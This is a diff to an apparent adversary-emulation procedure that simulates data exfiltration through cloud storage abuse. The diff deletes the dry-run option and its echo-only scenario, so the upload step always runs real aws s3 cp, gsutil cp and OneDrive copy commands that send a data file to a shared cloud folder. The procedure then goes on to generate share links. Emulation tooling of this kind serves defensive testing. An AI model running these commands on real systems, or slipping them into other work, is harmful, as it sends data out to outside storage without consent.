@@ -37,10 +37,6 @@ args:
   description: Password for share (if applicable)
   type: string
   default: sharepass123
-- name: dry_run
-  description: Enable dry-run mode
-  type: string
-  default: 'true'
 steps:
 - name: Verify file exists
   inline: test -f '{{ .Args.data_file }}' || (echo "File not found"; exit 1)
@@ -81,19 +77,22 @@ steps:
       echo "  Share protection: Password protected"
     fi
 - name: Upload to shared cloud folder
-  inline: "if [ '{{ .Args.dry_run }}' = 'true' ]; then\n  echo \"DRY RUN: Cloud Storage Abuse\"\n  echo \"Attack scenario:\"\
-    \n  echo \"  1. Compromise cloud account credentials\"\n  echo \"  2. Access shared team folder or team drive\"\n  echo\
-    \ \"  3. Upload exfiltrated data to shared location\"\n  echo \"  4. Create public or password-protected share link\"\n\
-    \  echo \"  5. Attacker accesses via share link\"\n  echo \"\"\n  echo \"Service: {{ .Args.cloud_service }}\"\n  echo\
-    \ \"Upload command example:\"\n  \n  case '{{ .Args.cloud_service }}' in\n    aws)\n      echo \"  aws s3 cp '{{ .Args.data_file\
-    \ }}' s3://bucket/{{ .Args.shared_folder_id }}/data.tar.gz\"\n      ;;\n    gcloud)\n      echo \"  gsutil cp '{{ .Args.data_file\
-    \ }}' gs://bucket/{{ .Args.shared_folder_id }}/data.tar.gz\"\n      ;;\n    onedrive)\n      echo \"  onedrive upload\
-    \ '{{ .Args.data_file }}' /{{ .Args.shared_folder_id }}/\"\n      ;;\n    *)\n      echo \"  [service-specific upload\
-    \ command]\"\n      ;;\n  esac\nelse\n  echo \"Attempting to upload to shared cloud folder...\"\n  case '{{ .Args.cloud_service\
-    \ }}' in\n    aws)\n      aws s3 cp '{{ .Args.data_file }}' \"s3://{{ .Args.shared_folder_id }}/$(basename '{{ .Args.data_file\
-    \ }}')\" || echo \"Upload failed\"\n      ;;\n    gcloud)\n      gsutil cp '{{ .Args.data_file }}' \"gs://{{ .Args.shared_folder_id\
-    \ }}/$(basename '{{ .Args.data_file }}')\" || echo \"Upload failed\"\n      ;;\n    *)\n      echo \"Service {{ .Args.cloud_service\
-    \ }} not implemented\"\n      ;;\n  esac\nfi\n"
+  inline: |
+    echo "Uploading to shared cloud folder..."
+    case '{{ .Args.cloud_service }}' in
+      aws)
+        aws s3 cp '{{ .Args.data_file }}' "s3://{{ .Args.shared_folder_id }}/$(basename '{{ .Args.data_file }}')" || echo "Upload failed"
+        ;;
+      gcloud)
+        gsutil cp '{{ .Args.data_file }}' "gs://{{ .Args.shared_folder_id }}/$(basename '{{ .Args.data_file }}')" || echo "Upload failed"
+        ;;
+      onedrive)
+        cp '{{ .Args.data_file }}' ~/OneDrive/'{{ .Args.shared_folder_id }}'/ || echo "Upload failed"
+        ;;
+      *)
+        echo "Service {{ .Args.cloud_service }} not implemented"
+        ;;
+    esac
 - name: Generate share link
   inline: "if [ '{{ .Args.public_share_enabled }}' = 'true' ]; then\n  echo \"Share link generated:\"\n  \n  case '{{ .Args.cloud_service\
     \ }}' in\n    aws)\n      echo \"  https://s3.amazonaws.com/{{ .Args.shared_folder_id }}/$(basename '{{ .Args.data_file\
